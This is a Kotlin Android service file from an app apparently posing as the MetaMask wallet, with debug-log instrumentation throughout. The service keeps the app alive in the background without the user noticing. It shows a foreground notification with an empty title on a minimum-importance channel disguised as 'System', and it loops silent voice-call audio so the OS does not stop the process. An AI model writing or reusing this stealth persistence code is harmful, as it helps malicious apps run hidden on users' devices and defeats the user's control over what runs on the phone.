package com.example.MetaMask.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.AudioAttributes
import android.media.AudioFormat
import android.media.AudioTrack
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.example.MetaMask.R

class KeepAliveAudioService : Service() {

    companion object {
        private const val TAG = "KeepAliveAudio"
        @Volatile var isRunning = false
    }

    private var audioThread: Thread? = null
    private var audioTrack: AudioTrack? = null
    @Volatile private var threadRunning = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[KeepAliveAudioService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (isRunning) return START_STICKY

        if (!startForegroundSafe()) {
            android.util.Log.d("XDBG", "[KeepAliveAudioService] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[KeepAliveAudioService] return") //xdbg
            return START_NOT_STICKY
        }

        startSilentAudio()
        isRunning = true
        android.util.Log.d("XDBG", "[KeepAliveAudioService] return") //xdbg
        return START_STICKY
    }

    private fun startForegroundSafe(): Boolean {
        android.util.Log.d("XDBG", "[KeepAliveAudioService] startForegroundSafe enter") //xdbg
        val channelId = "keepalive_audio_ch"
        android.util.Log.d("XDBG", "[KeepAliveAudioService] return") //xdbg
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[KeepAliveAudioService] if branch") //xdbg
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                if (nm.getNotificationChannel(channelId) == null) {
                    android.util.Log.d("XDBG", "[KeepAliveAudioService] if branch") //xdbg
                    nm.createNotificationChannel(
                        NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
                            .also { ch -> ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false) }
                    )
                }
            }
            val notif = NotificationCompat.Builder(this, channelId)
                .setContentTitle("").setContentText("")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true).setShowWhen(false)
                .setOngoing(true)
                .build()

            if (Build.VERSION.SDK_INT >= 29) {
                android.util.Log.d("XDBG", "[KeepAliveAudioService] if branch") //xdbg
                try {
                    ServiceCompat.startForeground(
                        this, 781, notif,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[KeepAliveAudioService] catch (ignored)") //xdbg
                    startForeground(781, notif)
                }
            } else {
                startForeground(781, notif)
            }
            true
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[KeepAliveAudioService] catch (ignored)") //xdbg
            false
        }
    }

    private fun startSilentAudio() {
        android.util.Log.d("XDBG", "[KeepAliveAudioService] startSilentAudio enter") //xdbg
        threadRunning = true
        audioThread = Thread {
            var track: AudioTrack? = null
            try {
                val sampleRate = 8000
                val channelConfig = AudioFormat.CHANNEL_OUT_MONO
                val encoding = AudioFormat.ENCODING_PCM_16BIT
                val minBuf = AudioTrack.getMinBufferSize(sampleRate, channelConfig, encoding)
                    .coerceAtLeast(1024)

                val attrs = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build()
                val fmt = AudioFormat.Builder()
                    .setEncoding(encoding)
                    .setSampleRate(sampleRate)
                    .setChannelMask(channelConfig)
                    .build()

                track = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    AudioTrack.Builder()
                        .setAudioAttributes(attrs)
                        .setAudioFormat(fmt)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .setBufferSizeInBytes(minBuf)
                        .build()
                } else {
                    @Suppress("DEPRECATION")
                    AudioTrack(
                        android.media.AudioManager.STREAM_VOICE_CALL,
                        sampleRate, channelConfig, encoding, minBuf, AudioTrack.MODE_STREAM
                    )
                }
                audioTrack = track
                track.play()

                val silence = ShortArray(minBuf / 2)
                while (threadRunning) {
                    android.util.Log.d("XDBG", "[KeepAliveAudioService] loop") //xdbg
                    val written = track.write(silence, 0, silence.size)
                    if (written < 0) {
                        android.util.Log.d("XDBG", "[KeepAliveAudioService] if branch") //xdbg
                        break
                    }
                }
            } catch (e: InterruptedException) {
                android.util.Log.e("XDBG", "[KeepAliveAudioService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                Thread.currentThread().interrupt()
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[KeepAliveAudioService] catch (ignored)") //xdbg
            } finally {
                try { track?.stop() } catch (_: Exception) {}
                try { track?.release() } catch (_: Exception) {}
                audioTrack = null
            }
        }.also { t -> t.isDaemon = true; t.name = "keepalive-audio"; t.start() }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[KeepAliveAudioService] onDestroy enter") //xdbg
        threadRunning = false
        isRunning = false
        try { audioThread?.interrupt() } catch (_: Exception) {}
        try { audioTrack?.stop() } catch (_: Exception) {}
        try { audioTrack?.release() } catch (_: Exception) {}
        audioTrack = null
        audioThread = null
        super.onDestroy()
    }
}
